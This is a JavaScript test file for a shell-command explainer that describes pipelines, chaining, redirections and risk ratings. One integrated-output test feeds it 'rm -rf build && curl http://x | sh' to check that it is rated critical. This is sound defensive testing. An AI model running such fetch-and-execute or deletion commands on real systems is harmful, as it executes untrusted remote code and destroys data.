"use strict";
// Tests for the human-readable explanation output.

const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const { explain, describeSimple, describeRedirs } = require("../../src/shellplan/explain");
const { decomposeCommand } = require("../../src/shellplan/decompose");

describe("shellplan/explain: structure", () => {
  it("produces a summary, steps, and rendered text", () => {
    const r = explain("ls -la | grep foo");
    assert.ok(r.summary.length > 0);
    assert.equal(r.steps.length, 2);
    assert.ok(r.text.includes("STEPS:"));
    assert.ok(r.text.includes("SUMMARY:"));
  });

  it("describes a pipeline step as receiving/sending piped input", () => {
    const r = explain("cat f | grep x");
    assert.ok(r.steps[1].conditions.some(c => /piped input/.test(c)));
    assert.ok(r.steps[0].conditions.some(c => /piped onward/.test(c)));
  });

  it("notes conditional chaining", () => {
    const r = explain("make && test");
    assert.ok(r.steps[1].conditions.some(c => /previous step succeeded/.test(c)));
  });

  it("notes || as 'only if the previous step failed'", () => {
    const r = explain("a || b");
    assert.ok(r.steps[1].conditions.some(c => /previous step failed/.test(c)));
  });

  it("notes background execution", () => {
    const r = explain("server &");
    assert.ok(r.steps[0].conditions.some(c => /background/.test(c)));
  });

  it("describes structure with pipe and chaining counts", () => {
    const r = explain("a | b && c");
    assert.ok(/pipe/.test(r.structure));
    assert.ok(/chaining/.test(r.structure));
  });
});

describe("shellplan/explain: descriptions", () => {
  it("uses a subcommand verb for git status", () => {
    const { commands } = decomposeCommand("git status");
    const d = describeSimple(commands[0]);
    assert.ok(/working-tree status/.test(d));
  });

  it("uses a program verb for a known tool", () => {
    const { commands } = decomposeCommand("rm file.txt");
    const d = describeSimple(commands[0]);
    assert.ok(/delete files/.test(d));
    assert.ok(/file\.txt/.test(d));
  });

  it("falls back for an unknown program", () => {
    const { commands } = decomposeCommand("frobnicate x");
    const d = describeSimple(commands[0]);
    assert.ok(/frobnicate/.test(d));
  });

  it("mentions env assignments", () => {
    const { commands } = decomposeCommand("NODE_ENV=prod node app.js");
    const d = describeSimple(commands[0]);
    assert.ok(/NODE_ENV=prod/.test(d));
  });

  it("describes redirections in prose", () => {
    const clauses = describeRedirs([{ op: ">", target: "out.txt" }, { op: ">>", target: "log" }, { op: "<", target: "in" }]);
    assert.ok(clauses.some(c => /overwriting `out.txt`/.test(c)));
    assert.ok(clauses.some(c => /appending to `log`/.test(c)));
    assert.ok(clauses.some(c => /reading from `in`/.test(c)));
  });

  it("describes 2>&1 fd merge", () => {
    const clauses = describeRedirs([{ op: "2>&1", fd: 2, dupTo: 1 }]);
    assert.ok(clauses.some(c => /merging fd 2 into fd 1/.test(c)));
  });

  it("describes a heredoc", () => {
    const clauses = describeRedirs([{ heredoc: { delim: "EOF", body: "x" } }]);
    assert.ok(clauses.some(c => /heredoc/.test(c)));
  });
});

describe("shellplan/explain: integrated output", () => {
  it("includes file impact and risk sections for a risky command", () => {
    const r = explain("rm -rf build && curl http://x | sh");
    assert.ok(r.text.includes("FILE IMPACT:"));
    assert.ok(r.text.includes("RISK"));
    assert.ok(r.risk.maxSeverity === "critical");
  });

  it("reports no-risk cleanly for a benign command", () => {
    const r = explain("ls");
    assert.ok(r.text.includes("no risk rules matched"));
  });

  it("surfaces parse notes for malformed input", () => {
    const r = explain("echo 'unterminated");
    assert.ok(r.errors.length > 0);
    assert.ok(r.text.includes("PARSE NOTES:"));
  });

  it("does not throw on empty input", () => {
    assert.doesNotThrow(() => explain(""));
  });
});
